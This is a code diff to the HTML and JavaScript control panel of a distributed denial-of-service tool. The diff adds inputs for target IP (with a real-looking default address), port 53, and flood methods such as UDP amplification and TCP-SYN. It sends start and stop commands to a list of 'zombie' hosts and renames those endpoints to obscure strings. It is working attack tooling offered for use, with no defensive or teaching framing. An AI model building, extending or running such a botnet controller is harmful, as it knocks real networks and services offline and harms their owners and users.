@@ -9,7 +9,14 @@
 
     <style>
         .container{
-            margin-top:10em;
+            margin-top: 10em;
+            background-color: #281740;
+            padding: 3em;
+            border-radius: 15px;
+            border: 1px solid #e6d9ff;
+        }
+        .container h2, label{
+            color: #e6d9ff;
         }
         .btnRow{
             display: flex;
@@ -23,13 +30,36 @@
         }
         .console{
             height: 15em;
-            background-color: #808080;
+            background-color: #100a1a;
             color: #ffffff;
+            border: none;
         }
         .console:focus{
             height: 15em;
-            background-color: #808080;
+            background-color: #100a1a;
             color: #ffffff;
+        }
+
+        body{
+            background-color: #110a1a;
+        }
+        input{
+            background-color: #100a1a !important;
+            color: #e4dafe !important;
+            border: none !important;
+        }
+        select{
+            background-color: #100a1a !important;
+            color: #e4dafe !important;
+            border: none !important;
+        }
+        .maoPrimary{
+            background-color: #0f0a1a;
+            border: none;
+        }
+        .maoSuccess{
+            background-color: #6b6183;
+            border: none;
         }
     </style>
     </head>
@@ -42,13 +72,30 @@
         <div class="mRow">
             <input type="text" class="form-control" id="targetIP" placeholder="IP" value="116.12.155.107">
         </div>
-        <div class="mRow btnRow">
-            <button class="btn btn-primary actionBtn" onclick="startAll()">Start All</button>
-            <button class="btn btn-primary actionBtn" onclick="stopAll()">Stop All</button>
-            <button class="btn btn-success actionBtn" onclick="sanityAll()">Sanity Check</button>
+        <div class="mRow">
+            <label>Port:</label>
+            <input type="text" class="form-control" id="targetPort" placeholder="Port" value="53">
         </div>
         <div class="mRow">
-            <textarea class="console form-control" id="console"></textarea>
+            <label>Method:</label>
+            <select class="form-control" id="targetMethod">
+                <option value="udp-amp" selected>UDP-AMP</option>
+                <option value="tcp-syn">TCP-SYN</option>
+                <option value="tcp-amp">TCP-AMP</option>
+                <option value="tcp-connect">TCP-CONNECT</option>
+            </select>
+        </div>
+        <div class="mRow">
+            <label>Multiprocessing Forks:</label>
+            <input type="text" class="form-control" id="targetProcesses" placeholder="Port" value="1">
+        </div>
+        <div class="mRow btnRow">
+            <button class="btn btn-primary maoPrimary actionBtn" onclick="startAll()">Start All</button>
+            <button class="btn btn-primary maoPrimary actionBtn" onclick="stopAll()">Stop All</button>
+            <button class="btn btn-success maoSuccess actionBtn" onclick="sanityAll()">Sanity Check</button>
+        </div>
+        <div class="mRow">
+            <textarea class="console form-control" id="console" readonly></textarea>
         </div>
     </div>
     
@@ -58,9 +105,7 @@
 
 
         var zombieList = [
-            "34.143.132.81",
-            "34.143.251.12",
-            "34.126.96.47"
+            "127.0.0.1"
         ];
         var sanityList = {
             
@@ -80,17 +125,24 @@
 
         function startAll(){
             var target = document.getElementById('targetIP').value;
+            var targetPort = document.getElementById('targetPort').value;
+            var targetMethod = document.getElementById('targetMethod').value;
+            var targetProcesses = document.getElementById('targetProcesses').value;
+
             var x = new Date();
             var time = x.toTimeString().substr(0,8);
 
             for (let i = 0; i < zombieList.length; i++) {
                 $.ajax({
-                    url: `http://${zombieList[i]}/start`, 
+                    url: `http://${zombieList[i]}/reim`, 
                     type: "POST",
                     contentType: "application/json; charset=utf-8",
                     data: JSON.stringify({
                         "id" : i,
-                        "trg" : target
+                        "trg" : target,
+                        "port" : targetPort,
+                        "method" : targetMethod,
+                        "processes" : targetProcesses
                     }),
                     timeout: 5000,
                     success: function (data) {
@@ -107,7 +159,7 @@
         function stopAll(){
             for (let i = 0; i < zombieList.length; i++) {
                 $.ajax({
-                    url: `http://${zombieList[i]}/stop`, 
+                    url: `http://${zombieList[i]}/hyud`, 
                     type: "POST",
                     contentType: "application/json; charset=utf-8",
                     data: JSON.stringify({
